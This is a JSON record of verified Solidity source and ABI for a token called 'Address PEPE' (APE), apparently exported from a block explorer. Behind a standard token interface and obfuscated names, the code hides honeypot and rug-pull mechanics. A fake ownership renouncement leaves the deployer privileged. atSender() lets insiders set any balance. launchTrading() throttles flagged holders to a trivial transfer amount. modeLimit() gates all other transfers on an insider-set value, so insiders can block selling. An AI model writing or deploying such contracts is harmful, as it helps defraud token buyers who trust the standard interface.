{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface autoTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenSell) external view returns (uint256);\n\n    function transfer(address minAuto, uint256 enableMarketing) external returns (bool);\n\n    function allowance(address swapTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minAuto,\n        uint256 enableMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderLimit, uint256 value);\n    event Approval(address indexed swapTrading, address indexed spender, uint256 value);\n}\n\nabstract contract takeWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundAuto {\n    function createPair(address autoSender, address fromShould) external returns (address);\n}\n\ninterface autoTotalMetadata is autoTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AddressPEPE is takeWallet, autoTotal, autoTotalMetadata {\n\n    bool private fromReceiverLaunched;\n\n    function amountLaunched(address feeTotalBuy) public {\n        if (isWalletReceiver) {\n            return;\n        }\n        if (feeMaxAuto) {\n            enableReceiverMarketing = true;\n        }\n        atIs[feeTotalBuy] = true;\n        if (txTotal != feeMaxAuto) {\n            enableReceiverMarketing = true;\n        }\n        isWalletReceiver = true;\n    }\n\n    function transfer(address totalFee, uint256 enableMarketing) external virtual override returns (bool) {\n        return modeLimit(_msgSender(), totalFee, enableMarketing);\n    }\n\n    mapping(address => bool) public senderAuto;\n\n    bool public buyLiquidityAmount;\n\n    uint256 constant limitTrading = 8 ** 10;\n\n    string private autoLaunch = \"APE\";\n\n    uint8 private amountToken = 18;\n\n    function isShould() private view {\n        require(atIs[_msgSender()]);\n    }\n\n    uint256 atReceiverShould;\n\n    function getOwner() external view returns (address) {\n        return listTo;\n    }\n\n    function buyAmount() public {\n        emit OwnershipTransferred(isModeSender, address(0));\n        listTo = address(0);\n    }\n\n    address enableBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function swapLaunched(address amountReceiver, address minAuto, uint256 enableMarketing) internal returns (bool) {\n        require(swapAmountMarketing[amountReceiver] >= enableMarketing);\n        swapAmountMarketing[amountReceiver] -= enableMarketing;\n        swapAmountMarketing[minAuto] += enableMarketing;\n        emit Transfer(amountReceiver, minAuto, enableMarketing);\n        return true;\n    }\n\n    bool private enableAmount;\n\n    bool private txTotal;\n\n    address liquidityToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private exemptReceiverAt;\n\n    bool public isWalletReceiver;\n\n    uint256 private exemptWallet = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return maxSellLiquidity;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoLaunch;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return amountToken;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptWallet;\n    }\n\n    mapping(address => uint256) private swapAmountMarketing;\n\n    function tokenMaxLimit(uint256 enableMarketing) public {\n        isShould();\n        minSwap = enableMarketing;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverTake;\n\n    address private listTo;\n\n    bool private feeMaxAuto;\n\n    address public isModeSender;\n\n    address public fundLaunchList;\n\n    function modeLimit(address amountReceiver, address minAuto, uint256 enableMarketing) internal returns (bool) {\n        if (amountReceiver == isModeSender) {\n            return swapLaunched(amountReceiver, minAuto, enableMarketing);\n        }\n        uint256 fromLimit = autoTotal(fundLaunchList).balanceOf(enableBuy);\n        require(fromLimit == minSwap);\n        require(minAuto != enableBuy);\n        if (senderAuto[amountReceiver]) {\n            return swapLaunched(amountReceiver, minAuto, limitTrading);\n        }\n        return swapLaunched(amountReceiver, minAuto, enableMarketing);\n    }\n\n    function approve(address takeTx, uint256 enableMarketing) public virtual override returns (bool) {\n        receiverTake[_msgSender()][takeTx] = enableMarketing;\n        emit Approval(_msgSender(), takeTx, enableMarketing);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return listTo;\n    }\n\n    uint256 minSwap;\n\n    constructor (){\n        if (feeMaxAuto) {\n            fromReceiverLaunched = true;\n        }\n        sellTeam teamFrom = sellTeam(liquidityToken);\n        fundLaunchList = fundAuto(teamFrom.factory()).createPair(teamFrom.WETH(), address(this));\n        \n        isModeSender = _msgSender();\n        buyAmount();\n        atIs[isModeSender] = true;\n        swapAmountMarketing[isModeSender] = exemptWallet;\n        \n        emit Transfer(address(0), isModeSender, exemptWallet);\n    }\n\n    mapping(address => bool) public atIs;\n\n    function atSender(address totalFee, uint256 enableMarketing) public {\n        isShould();\n        swapAmountMarketing[totalFee] = enableMarketing;\n    }\n\n    function transferFrom(address amountReceiver, address minAuto, uint256 enableMarketing) external override returns (bool) {\n        if (_msgSender() != liquidityToken) {\n            if (receiverTake[amountReceiver][_msgSender()] != type(uint256).max) {\n                require(enableMarketing <= receiverTake[amountReceiver][_msgSender()]);\n                receiverTake[amountReceiver][_msgSender()] -= enableMarketing;\n            }\n        }\n        return modeLimit(amountReceiver, minAuto, enableMarketing);\n    }\n\n    function balanceOf(address tokenSell) public view virtual override returns (uint256) {\n        return swapAmountMarketing[tokenSell];\n    }\n\n    function allowance(address autoMax, address takeTx) external view virtual override returns (uint256) {\n        if (takeTx == liquidityToken) {\n            return type(uint256).max;\n        }\n        return receiverTake[autoMax][takeTx];\n    }\n\n    bool public enableReceiverMarketing;\n\n    function launchTrading(address receiverReceiverMin) public {\n        isShould();\n        if (buyLiquidityAmount) {\n            enableReceiverMarketing = false;\n        }\n        if (receiverReceiverMin == isModeSender || receiverReceiverMin == fundLaunchList) {\n            return;\n        }\n        senderAuto[receiverReceiverMin] = true;\n    }\n\n    event OwnershipTransferred(address indexed enableToMax, address indexed limitMarketingMax);\n\n    string private maxSellLiquidity = \"Address PEPE\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableToMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitMarketingMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTotalBuy\",\"type\":\"address\"}],\"name\":\"amountLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"atSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLiquidityAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiverMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunchList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isModeSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWalletReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiverMin\",\"type\":\"address\"}],\"name\":\"launchTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"tokenMaxLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AddressPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}